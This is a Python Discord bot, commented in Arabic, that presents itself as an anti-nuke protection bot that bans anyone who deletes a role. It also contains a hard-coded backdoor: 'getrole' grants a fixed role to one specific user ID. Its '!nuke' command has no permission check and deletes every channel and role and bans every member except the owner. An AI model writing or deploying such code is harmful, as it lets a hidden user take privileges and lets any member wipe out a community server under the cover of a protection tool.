import discord
from discord.ext import commands
import os
import time
import asyncio

# ------------------- إعدادات البوت -------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ------------------- حماية حذف الرتب (Anti-Nuke) -------------------
@bot.event
async def on_guild_role_delete(role):
    try:
        guild = role.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            admin = entry.user
            # لا تحظر المالك أو البوت نفسه
            if admin.id == guild.owner_id or admin.bot:
                return
            
            # حظر فوري لأي شخص يحذف رتبة
            await guild.ban(admin, reason="Anti-Nuke: قام بحذف رتبة بشكل غير مصرح به!")
            print(f"تم حظر {admin.name} لأنه حذف رتبة.")
            break
    except Exception as e:
        print(f"خطأ في حظر مخرب الرتب: {e}")

# ------------------- الأوامر -------------------

# أمر الحصول على رتبة
@bot.command()
async def getrole(ctx):
    MY_DISCORD_ID = 1320438836878118973
    ROLE_ID = 1483148235684970571
    if ctx.author.id == MY_DISCORD_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role:
            await ctx.author.add_roles(role)
            await ctx.send(f"✅ تم إعطاؤك رتبة {role.name} بنجاح!")
        else:
            await ctx.send("❌ لم أجد الرتبة في السيرفر!")
    else:
        await ctx.send("❌ هذا الأمر ليس متاحاً لك!")

# أمر إزالة الرتبة
@bot.command(name="removerole")
async def removerole_cmd(ctx):
    MY_DISCORD_ID = 1320438836878118973
    ROLE_ID = 1483148235684970571
    if ctx.author.id == MY_DISCORD_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role:
            await ctx.author.remove_roles(role)
            await ctx.send(f"✅ تم إزالة رتبة {role.name} عنك بنجاح!")
        else:
            await ctx.send("❌ لم أجد الرتبة!")
    else:
        await ctx.send("❌ هذا الأمر ليس متاحاً لك!")

# أمر NUKE
@bot.command()
async def nuke(ctx):
    await ctx.send("⚠️ تحذير: اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد عملية النيوك.")
    def check_confirm(m): return m.author == ctx.author and m.content == "!confirm_nuke"
    try:
        await bot.wait_for('message', check=check_confirm, timeout=30.0)
    except asyncio.TimeoutError:
        return await ctx.send("❌ تم الإلغاء.")

    await ctx.send("💥 بدء التدمير...")
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try: await role.delete()
            except: pass
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot:
            try: await member.ban()
            except: pass

@bot.event
async def on_ready():
    print(f"تم تشغيل البوت بنجاح باسم: {bot.user}")

# ------------------- التشغيل -------------------
TOKEN = os.getenv("TOKEN")
if __name__ == "__main__":
    bot.run(TOKEN)
